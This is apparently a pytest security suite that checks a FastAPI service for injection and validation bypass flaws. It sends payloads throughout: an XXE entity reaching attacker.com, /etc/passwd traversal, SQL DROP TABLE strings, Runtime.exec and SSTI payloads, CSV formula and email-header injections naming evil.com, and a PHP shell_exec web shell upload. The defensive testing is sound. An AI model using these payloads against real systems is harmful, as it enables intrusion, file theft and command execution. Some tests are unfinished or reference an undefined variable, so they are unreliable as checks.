"""
Security tests for input validation and sanitization.
Tests for injection attacks, malformed input handling, and data validation bypasses.
"""

import pytest
import json
import base64
from typing import Dict, Any
from fastapi.testclient import TestClient
from unittest.mock import patch, MagicMock

from main import app


class TestInputValidationSecurity:
    """Test suite for input validation security vulnerabilities."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def auth_headers(self):
        """Mock authentication headers."""
        return {"Authorization": "Bearer mock-token"}

    def test_json_parsing_vulnerabilities(self, client, auth_headers):
        """Test for JSON parsing vulnerabilities."""
        # Test deeply nested JSON (JSON bomb)
        nested_json = {"level": {}}
        current = nested_json["level"]
        for i in range(1000):  # Create deep nesting
            current["next"] = {}
            current = current["next"]

        response = client.post(
            "/api/processing/start", json=nested_json, headers=auth_headers
        )

        # Should handle deeply nested JSON without crashing
        assert response.status_code != 500 or "recursion" not in response.text.lower()

    def test_large_payload_handling(self, client, auth_headers):
        """Test handling of oversized payloads."""
        # Test with very large JSON payload
        large_data = {"data": "A" * (10 * 1024 * 1024)}  # 10MB string

        response = client.post(
            "/api/processing/start", json=large_data, headers=auth_headers
        )

        # Should reject or handle large payloads gracefully
        assert response.status_code in [
            413,
            400,
            422,
        ]  # Payload too large or validation error

    def test_null_byte_injection(self, client, auth_headers):
        """Test for null byte injection vulnerabilities."""
        null_byte_payloads = [
            "test\x00.txt",
            "../../etc/passwd\x00.jpg",
            "file.txt\x00.php",
            "query\x00'; DROP TABLE users; --",
        ]

        for payload in null_byte_payloads:
            # Test on file operations
            response = client.get(f"/api/folders/{payload}", headers=auth_headers)

            # Should handle null bytes safely
            if response.status_code == 200:
                content = response.text
                # Check if null byte caused unexpected behavior
                if "\x00" in content or "passwd" in content:
                    pytest.fail(
                        f"VULNERABILITY: Null byte injection with payload: {payload}"
                    )

    def test_unicode_normalization_attacks(self, client, auth_headers):
        """Test for Unicode normalization attacks."""
        unicode_payloads = [
            "..\\u002e\\u002e\\u005c",  # Unicode-encoded path traversal
            "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",  # Unicode XSS
            "\\u0027; DROP TABLE users; --",  # Unicode SQL injection
            "\\uff1c\\uff53\\uff43\\uff52\\uff49\\uff50\\uff54\\uff1e",  # Fullwidth characters
        ]

        for payload in unicode_payloads:
            response = client.get(f"/api/search?query={payload}", headers=auth_headers)

            # Should normalize Unicode safely
            if payload.replace("\\u", "") in response.text:
                pytest.fail(f"VULNERABILITY: Unicode normalization attack: {payload}")

    def test_base64_injection(self, client, auth_headers):
        """Test for Base64 encoding injection attacks."""
        # Encode malicious payloads in Base64
        malicious_payloads = [
            "'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "../../../etc/passwd",
            "$(whoami)",
        ]

        for payload in malicious_payloads:
            encoded_payload = base64.b64encode(payload.encode()).decode()

            response = client.post(
                "/api/processing/start",
                json={"encoded_data": encoded_payload},
                headers=auth_headers,
            )

            # Should not execute decoded malicious content
            if response.status_code == 500:
                error_text = response.text.lower()
                if any(
                    keyword in error_text
                    for keyword in ["syntax error", "command not found", "no such file"]
                ):
                    pytest.fail(
                        f"VULNERABILITY: Base64 injection with payload: {payload}"
                    )

    def test_xml_external_entity_injection(self, client, auth_headers):
        """Test for XXE (XML External Entity) injection."""
        xxe_payloads = [
            """<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
            <data>&xxe;</data>""",
            """<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/steal">]>
            <data>&xxe;</data>""",
            """<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/hostname">%xxe;]>
            <data>test</data>""",
        ]

        for payload in xxe_payloads:
            # If the API accepts XML data
            response = client.post(
                "/api/processing/xml",
                data=payload,
                headers={**auth_headers, "Content-Type": "application/xml"},
            )

            # Should not process external entities
            if response.status_code == 200:
                content = response.text
                if "root:" in content or "bin:" in content:
                    pytest.fail("VULNERABILITY: XXE injection successful")

    def test_ldap_injection(self, client, auth_headers):
        """Test for LDAP injection vulnerabilities."""
        ldap_payloads = [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "*))%00",
            "admin)(&(password=*)",
        ]

        for payload in ldap_payloads:
            # If the API uses LDAP for authentication/search
            response = client.post(
                "/api/auth/ldap-search", json={"query": payload}, headers=auth_headers
            )

            # Should not allow LDAP injection
            if response.status_code == 200:
                # Check if unauthorized data is returned
                data = response.json()
                if isinstance(data, list) and len(data) > expected_results:
                    pytest.fail(
                        f"VULNERABILITY: LDAP injection with payload: {payload}"
                    )

    def test_nosql_injection(self, client, auth_headers):
        """Test for NoSQL injection vulnerabilities."""
        nosql_payloads = [
            {"$ne": None},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "this.password == 'admin'"},
            {"$or": [{"password": {"$exists": True}}]},
        ]

        for payload in nosql_payloads:
            response = client.post(
                "/api/search/nosql", json={"filter": payload}, headers=auth_headers
            )

            # Should not allow NoSQL injection
            if response.status_code == 200:
                data = response.json()
                # Check for unauthorized data access
                if len(data.get("results", [])) > 100:  # Unusually large result set
                    pytest.fail(
                        f"VULNERABILITY: NoSQL injection with payload: {payload}"
                    )

    def test_expression_language_injection(self, client, auth_headers):
        """Test for expression language injection."""
        el_payloads = [
            "${7*7}",
            "#{7*7}",
            "${java.lang.Runtime.getRuntime().exec('whoami')}",
            "${@java.lang.Runtime@getRuntime().exec('id')}",
            "${{7*7}}",
        ]

        for payload in el_payloads:
            response = client.post(
                "/api/processing/template",
                json={"template": f"Hello {payload}"},
                headers=auth_headers,
            )

            # Should not evaluate expressions
            if response.status_code == 200:
                content = response.text
                if "49" in content:  # 7*7 was evaluated
                    pytest.fail(
                        f"VULNERABILITY: Expression injection with payload: {payload}"
                    )

    def test_server_side_template_injection(self, client, auth_headers):
        """Test for Server-Side Template Injection (SSTI)."""
        ssti_payloads = [
            "{{7*7}}",
            "{{config}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "${7*7}",
            "<%=7*7%>",
            "{7*7}",
        ]

        for payload in ssti_payloads:
            response = client.post(
                "/api/processing/render",
                json={"template": payload},
                headers=auth_headers,
            )

            # Should not execute template code
            if response.status_code == 200:
                content = response.text
                if "49" in content or "class" in content:
                    pytest.fail(f"VULNERABILITY: SSTI with payload: {payload}")

    def test_csv_injection(self, client, auth_headers):
        """Test for CSV injection vulnerabilities."""
        csv_payloads = [
            "=cmd|'/c calc'!A0",
            "@SUM(1+1)*cmd|'/c calc'!A0",
            "+cmd|'/c calc'!A0",
            "-cmd|'/c calc'!A0",
            '=HYPERLINK("http://evil.com","Click me")',
        ]

        for payload in csv_payloads:
            response = client.post(
                "/api/export/csv",
                json={"data": [{"name": payload, "value": "test"}]},
                headers=auth_headers,
            )

            # Should sanitize CSV output
            if response.status_code == 200:
                content = response.text
                # CSV should be sanitized (formulas prefixed with ')
                if payload in content and not content.startswith("'"):
                    pytest.fail(f"VULNERABILITY: CSV injection with payload: {payload}")

    def test_email_header_injection(self, client, auth_headers):
        """Test for email header injection."""
        email_payloads = [
            "test@example.com\nBCC: attacker@evil.com",
            "test@example.com%0ABcc: attacker@evil.com",
            "test@example.com\r\nBcc: attacker@evil.com",
            "test@example.com%0D%0ABcc: attacker@evil.com",
        ]

        for payload in email_payloads:
            response = client.post(
                "/api/notifications/send",
                json={"to": payload, "subject": "Test", "body": "Test message"},
                headers=auth_headers,
            )

            # Should prevent email header injection
            # This would require checking actual email sending behavior
            pass

    def test_http_response_splitting(self, client, auth_headers):
        """Test for HTTP response splitting vulnerabilities."""
        response_splitting_payloads = [
            "test\r\nSet-Cookie: malicious=value",
            "test%0d%0aSet-Cookie: evil=true",
            "test\n\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n<script>alert('XSS')</script>",
        ]

        for payload in response_splitting_payloads:
            response = client.get(f"/api/redirect?url={payload}", headers=auth_headers)

            # Should not allow response splitting
            # Check response headers for malicious content
            for header_name, header_value in response.headers.items():
                if "malicious" in header_value or "evil" in header_value:
                    pytest.fail(
                        f"VULNERABILITY: HTTP response splitting with payload: {payload}"
                    )

    def test_parameter_pollution(self, client, auth_headers):
        """Test for HTTP parameter pollution vulnerabilities."""
        # Test multiple parameters with same name
        response = client.get(
            "/api/search?query=safe&query=malicious&filter=normal&filter=admin",
            headers=auth_headers,
        )

        # Should handle parameter pollution consistently
        # The behavior depends on how the framework handles duplicate parameters
        if response.status_code == 200:
            # Check if sensitive operations were performed due to parameter confusion
            pass

    def test_content_type_confusion(self, client, auth_headers):
        """Test for content type confusion attacks."""
        # Send JSON data with XML content type
        json_data = {"test": "value"}
        response = client.post(
            "/api/processing/start",
            json=json_data,
            headers={**auth_headers, "Content-Type": "application/xml"},
        )

        # Should validate content type matches content
        if response.status_code == 200:
            # Check if JSON was processed despite XML content type
            pass

    def test_file_upload_vulnerabilities(self, client, auth_headers):
        """Test for file upload security vulnerabilities."""
        malicious_files = [
            (
                "test.php",
                b"<?php echo shell_exec($_GET['cmd']); ?>",
                "application/x-php",
            ),
            ("test.exe", b"MZ\x90\x00", "application/x-msdownload"),
            ("test.jsp", b'<%@ page import="java.io.*" %>', "application/x-jsp"),
            (
                "test.js",
                b"require('child_process').exec('whoami')",
                "application/javascript",
            ),
            ("../../../test.txt", b"Path traversal test", "text/plain"),
        ]

        for filename, content, content_type in malicious_files:
            files = {"file": (filename, content, content_type)}

            response = client.post(
                "/api/files/upload", files=files, headers=auth_headers
            )

            # Should reject or sanitize malicious files
            if response.status_code == 200:
                # Check if file was stored with original dangerous name/extension
                response_data = response.json()
                stored_filename = response_data.get("filename", "")

                # Should not store files with dangerous extensions in executable locations
                dangerous_extensions = [".php", ".exe", ".jsp", ".js"]
                if any(ext in stored_filename for ext in dangerous_extensions):
                    pytest.fail(f"VULNERABILITY: Dangerous file upload: {filename}")

    def test_integer_overflow_vulnerabilities(self, client, auth_headers):
        """Test for integer overflow vulnerabilities."""
        overflow_values = [
            2**31,  # 32-bit signed integer max + 1
            2**63,  # 64-bit signed integer max + 1
            -(2**31) - 1,  # 32-bit signed integer min - 1
            "9" * 50,  # Very large number as string
        ]

        for value in overflow_values:
            response = client.post(
                "/api/processing/calculate",
                json={"number": value},
                headers=auth_headers,
            )

            # Should handle integer overflow gracefully
            if response.status_code == 500:
                error_text = response.text.lower()
                if "overflow" in error_text or "out of range" in error_text:
                    pytest.fail(f"VULNERABILITY: Integer overflow with value: {value}")


class TestDataValidationBypass:
    """Test suite for data validation bypass attempts."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def auth_headers(self):
        """Mock authentication headers."""
        return {"Authorization": "Bearer mock-token"}

    def test_required_field_bypass(self, client, auth_headers):
        """Test bypassing required field validation."""
        # Test with missing required fields
        incomplete_data = {}  # Missing all required fields

        response = client.post(
            "/api/processing/start", json=incomplete_data, headers=auth_headers
        )

        # Should reject incomplete data
        assert response.status_code in [400, 422]

    def test_field_type_bypass(self, client, auth_headers):
        """Test bypassing field type validation."""
        type_confusion_data = [
            {"expected_string": 123},
            {"expected_number": "not_a_number"},
            {"expected_boolean": "maybe"},
            {"expected_array": "not_array"},
            {"expected_object": "not_object"},
        ]

        for data in type_confusion_data:
            response = client.post(
                "/api/processing/start", json=data, headers=auth_headers
            )

            # Should reject type mismatches
            assert response.status_code in [400, 422]

    def test_length_constraint_bypass(self, client, auth_headers):
        """Test bypassing length constraints."""
        # Test with oversized strings
        oversized_data = {
            "name": "A" * 10000,  # Assuming there's a length limit
            "description": "B" * 100000,
        }

        response = client.post(
            "/api/processing/start", json=oversized_data, headers=auth_headers
        )

        # Should enforce length limits
        assert response.status_code in [400, 422]

    def test_enum_value_bypass(self, client, auth_headers):
        """Test bypassing enum value validation."""
        invalid_enum_data = {
            "status": "invalid_status",
            "priority": "not_a_priority",
            "category": "nonexistent_category",
        }

        response = client.post(
            "/api/processing/start", json=invalid_enum_data, headers=auth_headers
        )

        # Should reject invalid enum values
        assert response.status_code in [400, 422]

    def test_regex_pattern_bypass(self, client, auth_headers):
        """Test bypassing regex pattern validation."""
        invalid_patterns = {
            "email": "not_an_email",
            "phone": "not_a_phone",
            "url": "not_a_url",
            "uuid": "not_a_uuid",
        }

        response = client.post(
            "/api/processing/start", json=invalid_patterns, headers=auth_headers
        )

        # Should reject invalid patterns
        assert response.status_code in [400, 422]

    def test_business_logic_bypass(self, client, auth_headers):
        """Test bypassing business logic validation."""
        # Test business rule violations
        business_violations = [
            {"start_date": "2023-12-31", "end_date": "2023-01-01"},  # End before start
            {"quantity": -1},  # Negative quantity
            {"discount": 150},  # Discount over 100%
            {"age": -5},  # Negative age
        ]

        for violation in business_violations:
            response = client.post(
                "/api/processing/start", json=violation, headers=auth_headers
            )

            # Should enforce business rules
            assert response.status_code in [400, 422]
